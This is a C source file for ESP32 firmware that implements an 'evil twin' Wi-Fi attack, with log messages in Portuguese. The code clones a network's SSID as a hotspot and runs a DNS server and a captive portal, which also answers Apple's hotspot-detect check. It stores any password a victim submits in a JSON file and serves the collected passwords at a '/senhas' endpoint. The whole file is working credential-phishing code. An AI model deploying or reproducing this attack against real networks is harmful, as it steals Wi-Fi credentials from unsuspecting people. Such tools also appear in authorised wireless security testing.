// Copyright (c) 2025 HIGH CODE LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#include "evil_twin.h"
#include "dns_server.h"
#include "esp_err.h"
#include "esp_log.h"
#include "http_server_service.h"
#include "storage_write.h"
#include "storage_read.h"
#include "storage_impl.h"
#include "cJSON.h"
#include "wifi_service.h"
#include <stdlib.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"

static const char *TAG = "EVIL_TWIN_BACKEND";

#define PATH_HTML_INDEX "/assets/storage/captive_portal/html/evil_twin_index.html"
#define PATH_HTML_THANKS "/assets/storage/captive_portal/html/evil_twin_thank_you.html"
#define PATH_PASSWORDS_JSON "/storage/captive_portal/passwords.json"

static SemaphoreHandle_t storage_mutex = NULL;

static char* load_file_dynamic(const char* path);
static void init_storage_mutex();


static esp_err_t submit_post_handler(httpd_req_t *req) {
  char buf[256];
  int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
  if (ret <= 0) return ESP_FAIL;
  buf[ret] = '\0';

  char password[64] = {0};
  if (http_service_query_key_value(buf, "password", password, sizeof(password)) == ESP_OK) {

    if (xSemaphoreTake(storage_mutex, pdMS_TO_TICKS(5000)) == pdTRUE) {
      cJSON *root_array = NULL;
      char *existing_json = load_file_dynamic(PATH_PASSWORDS_JSON);

      if (existing_json) {
        root_array = cJSON_Parse(existing_json);
        free(existing_json);
      }

      if (root_array == NULL) {
        root_array = cJSON_CreateArray();
      }

      cJSON *entry = cJSON_CreateObject();
      cJSON_AddStringToObject(entry, "user", "");
      cJSON_AddStringToObject(entry, "password", password);
      cJSON_AddStringToObject(entry, "2fa", "");
      cJSON_AddStringToObject(entry, "token", "");
      cJSON_AddItemToArray(root_array, entry);

      char *output = cJSON_PrintUnformatted(root_array);
      if (output) {
        storage_write_string(PATH_PASSWORDS_JSON, output);
        free(output);
      }
      cJSON_Delete(root_array);

      xSemaphoreGive(storage_mutex); 
      ESP_LOGI(TAG, "Senha salva com sucesso no JSON");
    } else {
      ESP_LOGE(TAG, "Timeout ao tentar obter Mutex para salvar senha");
    }
  }

  char *thanks = load_file_dynamic(PATH_HTML_THANKS);
  if (thanks) {
    http_service_send_response(req, thanks, HTTPD_RESP_USE_STRLEN);
    free(thanks);
  } else {
    http_service_send_response(req, "<h1>Obrigado!</h1>", HTTPD_RESP_USE_STRLEN);
  }

  return ESP_OK;
}

static void init_storage_mutex() {
    if (storage_mutex == NULL) {
        storage_mutex = xSemaphoreCreateMutex();
    }
}

static esp_err_t passwords_get_handler(httpd_req_t *req) {
  init_storage_mutex();

  if (xSemaphoreTake(storage_mutex, pdMS_TO_TICKS(2000)) == pdTRUE) {
    char *json_data = load_file_dynamic(PATH_PASSWORDS_JSON);
    xSemaphoreGive(storage_mutex);

    if (json_data) {
      httpd_resp_set_type(req, "application/json");
      http_service_send_response(req, json_data, HTTPD_RESP_USE_STRLEN);
      free(json_data);
      return ESP_OK;
    }
  }

  http_service_send_response(req, "[]", HTTPD_RESP_USE_STRLEN); // Retorna array vazio se não houver arquivo
  return ESP_OK;
}

static esp_err_t captive_portal_get_handler(httpd_req_t *req) {
    char *html = load_file_dynamic(PATH_HTML_INDEX);
    if (html) {
        http_service_send_response(req, html, HTTPD_RESP_USE_STRLEN);
        free(html);
        return ESP_OK;
    }
    http_service_send_error(req, HTTP_STATUS_NOT_FOUND_404, "Portal HTML not found");
    return ESP_FAIL;
}


// THIS FUNCTION SAVE PASSWORDS IN RAM
// static esp_err_t save_captured_password(const char *password) {
//     if (password_count >= MAX_PASSWORDS) {
//         ESP_LOGW(TAG, "Lista de senhas cheia! Ignorando: %s", password);
//         return ESP_FAIL;
//     }
//
//     strncpy(captured_passwords[password_count], password, MAX_PASSWORD_LEN);
//     captured_passwords[password_count][MAX_PASSWORD_LEN - 1] = '\0';
//
//     password_count++;
//     ESP_LOGI(TAG, "Senha capturada e salva [%d]: %s", password_count, password);
//
//     return ESP_OK;
// }

static void register_evil_twin_handlers(void) {
  start_web_server();
  httpd_uri_t submit_uri = {.uri = "/submit", .method = HTTP_POST, .handler = submit_post_handler};
  http_service_register_uri(&submit_uri);

  httpd_uri_t passwords_uri = {.uri = "/senhas", .method = HTTP_GET, .handler = passwords_get_handler};
  http_service_register_uri(&passwords_uri);

  httpd_uri_t root_uri = {.uri = "/", .method = HTTP_GET, .handler = captive_portal_get_handler};
  http_service_register_uri(&root_uri);

  httpd_uri_t captive_portal_uri = {
      .uri = "/hotspot-detect.html",
      .method = HTTP_GET,
      .handler = captive_portal_get_handler,
      .user_ctx = NULL};
  http_service_register_uri(&captive_portal_uri);
}

void evil_twin_start_attack(const char *ssid) {
  init_storage_mutex(); 
  ESP_LOGI(TAG, "Iniciando Evil Twin: %s", ssid);

  wifi_change_to_hotspot(ssid);
  start_dns_server();
  vTaskDelay(pdMS_TO_TICKS(1000));

  register_evil_twin_handlers();
  ESP_LOGI(TAG, "Ataque ativo e Mutex pronto.");
}

void evil_twin_stop_attack(void) {
  stop_http_server();
  stop_dns_server();
  // wifi_service_init(); // Restaura o modo Wi-Fi padrão
  if (storage_mutex != NULL) {
    vSemaphoreDelete(storage_mutex);
    storage_mutex = NULL; 
  }
  ESP_LOGI(TAG, "Lógica do Evil Twin parada.");
}

static char* load_file_dynamic(const char* path) {
  size_t size;
  if (storage_file_get_size(path, &size) != ESP_OK || size == 0) {
    ESP_LOGE(TAG, "Failed to measure file or empty file: %s", path);
    return NULL;
  }

  char *buffer = malloc(size + 1);
  if (buffer == NULL) {
    ESP_LOGE(TAG, "Memory failed for buffer of %d bytes", size);
    return NULL;
  }

  if (storage_read_string(path, buffer, size + 1) != ESP_OK) {
    free(buffer);
    return NULL;
  }

  return buffer; 
}
